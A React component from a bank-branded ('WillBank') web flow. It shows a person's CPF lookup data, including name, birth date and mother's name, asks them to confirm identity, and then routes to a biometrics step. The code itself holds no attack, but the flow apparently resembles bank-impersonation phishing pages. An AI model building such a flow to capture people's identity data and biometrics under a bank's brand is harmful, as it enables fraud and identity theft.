import { useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Shield } from "lucide-react";
import WillBankHeader from "@/components/WillBankHeader";
import WillBankCard from "@/components/WillBankCard";
import WillBankFooter from "@/components/WillBankFooter";
import { CPFData } from "@/lib/cpf";

const ConfirmaDados = () => {
  const navigate = useNavigate();
  const location = useLocation();

  const cpfData: CPFData | undefined = location.state?.cpfData;

  useEffect(() => {
    if (!cpfData) {
      navigate("/");
    }
  }, [cpfData, navigate]);

  const handleConfirmar = () => {
    navigate("/biometria", { state: { cpfData } });
  };

  const handleCorrigir = () => {
    navigate("/");
  };

  if (!cpfData) return null;

  const dataFields = [
    { label: "Nome completo", value: cpfData.nome },
    { label: "Data de nascimento", value: cpfData.dataNascimento },
    { label: "Nome da mãe", value: cpfData.nomeMae },
    { label: "CPF", value: cpfData.cpf },
    { label: "Sexo", value: cpfData.sexo },
  ];

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <WillBankHeader userName={cpfData.nome.split(' ')[0].toUpperCase()} />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
        <WillBankCard className="w-full max-w-lg">
          <div className="space-y-8">
            <div className="text-center space-y-3">
              <h1 className="text-2xl sm:text-3xl font-bold text-foreground tracking-tight">
                Confirme se você é essa pessoa
              </h1>
              <p className="text-muted-foreground">
                Verifique se os dados estão corretos antes de continuar.
              </p>
            </div>

            {/* Data Fields */}
            <div className="border-2 border-border/60 rounded-2xl divide-y divide-border/40 overflow-hidden shadow-sm">
              {dataFields.map((field, index) => (
                <div key={index} className="p-4 text-center bg-card hover:bg-muted/30 transition-colors">
                  <p className="text-sm text-muted-foreground font-medium underline decoration-dotted underline-offset-4">{field.label}</p>
                  <p className="font-bold text-foreground mt-1.5 text-lg">{field.value}</p>
                </div>
              ))}
            </div>

            {/* Action Buttons */}
            <div className="space-y-4">
              <Button 
                onClick={handleConfirmar}
                className="w-full h-14 text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground rounded-full shadow-lg hover:shadow-xl transition-all duration-300"
              >
                Sim, sou eu
              </Button>
              
              <Button 
                onClick={handleCorrigir}
                variant="outline"
                className="w-full h-12 text-base font-semibold rounded-full border-2 hover:bg-muted/50 transition-all duration-200"
              >
                Não sou eu, corrigir dados
              </Button>
            </div>

            {/* Security Badge */}
            <div className="flex items-center justify-center gap-2.5 text-muted-foreground pt-2">
              <div className="p-1.5 bg-primary/10 rounded-full">
                <Shield className="w-4 h-4 text-primary" />
              </div>
              <span className="text-sm font-medium">Dados consultados de forma segura e oficial</span>
            </div>
          </div>
        </WillBankCard>
      </main>

      <WillBankFooter />
    </div>
  );
};

export default ConfirmaDados;
